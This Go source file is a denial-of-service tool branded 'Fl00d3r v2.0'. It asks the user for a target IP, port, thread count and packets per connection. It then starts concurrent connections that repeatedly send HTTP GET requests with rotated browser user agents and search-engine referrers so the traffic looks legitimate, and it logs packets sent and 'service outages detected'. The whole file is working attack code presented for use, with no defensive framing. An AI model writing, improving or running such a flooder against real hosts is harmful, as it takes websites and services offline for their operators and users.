package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"sync"
	"time"
)

// Configuration for the attack
type Config struct {
	TargetIP   string
	Port       int
	Packets    int
	Threads    int
	UserAgents []string
	Referrers  []string
	AcceptAll  []string
}

// Metrics to track the status of the attack
type Metrics struct {
	PacketsSent int
	Outages     int
	Mutex       sync.Mutex
}

// delayPrint mimics slow typing for banner display
func delayPrint(s string) {
	for _, c := range s {
		fmt.Print(string(c))
		time.Sleep(10 * time.Millisecond)
	}
}

// displayBanner shows a startup banner for the tool
func displayBanner() {
	banner := `
    ********************
      __ _  ___   ___      _ ____       
     / _| |/ _ \ / _ \    | |___ \      
    | |_| | | | | | | | __| | __) |_ __ 
    |  _| | | | | | | |/ _` + "`" + ` ||__ <| '__|
    | | | | |_| | |_| | (_| |___) | |   
    |_| |_|\___/ \___/ \__,_|____/|_|   
                                     
    ReCoded by d57 x chocho
    Fl00d3r v2.0
    ********************
`
	delayPrint(banner)
}

// attack performs the flooding attack and tracks metrics
func attack(config Config, metrics *Metrics, wg *sync.WaitGroup) {
	defer wg.Done()

	userAgent := config.UserAgents[rand.Intn(len(config.UserAgents))]
	referer := config.Referrers[rand.Intn(len(config.Referrers))]
	accept := config.AcceptAll[rand.Intn(len(config.AcceptAll))]

	target := fmt.Sprintf("%s:%d", config.TargetIP, config.Port)

	conn, err := net.Dial("tcp", target)
	if err != nil {
		log.Printf("[Error] Failed to connect to %s: %v\n", target, err)
		metrics.Mutex.Lock()
		metrics.Outages++
		metrics.Mutex.Unlock()
		return
	}
	defer conn.Close()

	// Construct the HTTP request
	request := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nReferer: %s%s\r\n\r\n",
		config.TargetIP, userAgent, referer, accept)

	for i := 0; i < config.Packets; i++ {
		_, err := conn.Write([]byte(request))
		if err != nil {
			log.Printf("[Error] Failed to send packet to %s: %v\n", target, err)
			metrics.Mutex.Lock()
			metrics.Outages++
			metrics.Mutex.Unlock()
			return
		}

		// Track successfully sent packets
		metrics.Mutex.Lock()
		metrics.PacketsSent++
		metrics.Mutex.Unlock()

		log.Printf("[Info] Sent packet to %s | Total Packets Sent: %d\n", target, metrics.PacketsSent)
	}

	// Check if server is responding after attack
	_, err = conn.Read(make([]byte, 1))
	if err != nil {
		log.Printf("[Warning] Service outage detected for %s:%d\n", config.TargetIP, config.Port)
		metrics.Mutex.Lock()
		metrics.Outages++
		metrics.Mutex.Unlock()
	}
}

func main() {
	displayBanner()

	// Get inputs from user
	var config Config
	fmt.Print("Target IP: ")
	fmt.Scanln(&config.TargetIP)
	fmt.Print("Port: ")
	fmt.Scanln(&config.Port)
	fmt.Print("Packets per connection: ")
	fmt.Scanln(&config.Packets)
	fmt.Print("Threads: ")
	fmt.Scanln(&config.Threads)

	// Example user agents, referrers, and accept headers
	config.UserAgents = []string{
		"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
		"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
		"Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
	}
	config.Referrers = []string{
		"http://www.bing.com/search?q=",
		"https://www.yandex.com/yandsearch?text=",
		"https://duckduckgo.com/?q=",
	}
	config.AcceptAll = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Encoding: gzip, deflate",
		"Accept-Language: en-US,en;q=0.5",
	}

	// Initialize metrics
	metrics := &Metrics{
		PacketsSent: 0,
		Outages:     0,
	}

	// Clear the console
	exec.Command("clear").Run()

	log.Println("Ensure you have a fast internet connection.")
	delayPrint("Initializing the attack...\n")

	// Setup the attack using goroutines and WaitGroup for concurrency control
	var wg sync.WaitGroup
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go attack(config, metrics, &wg)
	}

	// Wait for all threads to finish
	wg.Wait()

	// Print final metrics
	log.Printf("Attack complete. Total Packets Sent: %d, Service Outages Detected: %d\n", metrics.PacketsSent, metrics.Outages)
}
